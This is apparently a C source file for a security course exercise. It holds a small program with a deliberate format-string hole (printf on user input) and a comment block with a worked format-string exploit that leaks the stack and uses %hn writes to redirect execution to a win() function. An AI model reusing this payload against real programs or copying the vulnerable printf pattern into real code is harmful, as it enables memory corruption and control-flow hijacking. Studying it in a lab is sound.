/*
Use the necessary tools to perform analysis of the compiled source code generated. Since we
are working in 32-bit use “-m32” for your gcc compilation options. For compilation I would
suggest using compiler option “-fno-stack-protector” and “-z execstack”. Please submit
write-ups of your analysis. Your points will be based on completeness of analysis, your
understanding of the problems, and if you were able to achieve the goals.

To compile:
gcc -m32 -fno-stack-protector -z execstack file.c -o file

Problem 3: 10pts
Cause a CFD to win()

1:
We must find ESP, leak the stack with:
%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x
or
%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-

ESP: 0xffffd18c
\x8c\xd1\xff\xff

\x8c\xd1\xff\xff
\x8d\xd1\xff\xff
\x8e\xd1\xff\xff
\x8f\xd1\xff\xff

\x8c\xd1\xff\xff\x8d\xd1\xff\xff\x8e\xd1\xff\xff\x8f\xd1\xff\xff

%0x.%7$hn
%0x.%8$hn
%0x.%9$hn
%0x.%10$hn

\x8c\xd1\xff\xff\x8d\xd1\xff\xff\x8e\xd1\xff\xff\x8f\xd1\xff\xff%252x.%7$hn%84x.%8$hn%242x.%9$hn%256x.%10$hn

r <<< $(python -c 'print "\x8c\xd1\xff\xff\x8d\xd1\xff\xff\x8e\xd1\xff\xff\x8f\xd1\xff\xff%252x.%7$hn%84x.%8$hn%242x.%9$hn%256x.%10$hn"')
*/

#include <stdio.h>
#include <stdlib.h>

// 0x5655620d
void win(){
    printf("Winner winner Chicken Dinner!\n");
}

void main(int argc, char* argv[]){
    char buf[100];
    fgets(buf, 100, stdin);
    printf(buf);

    return;
}
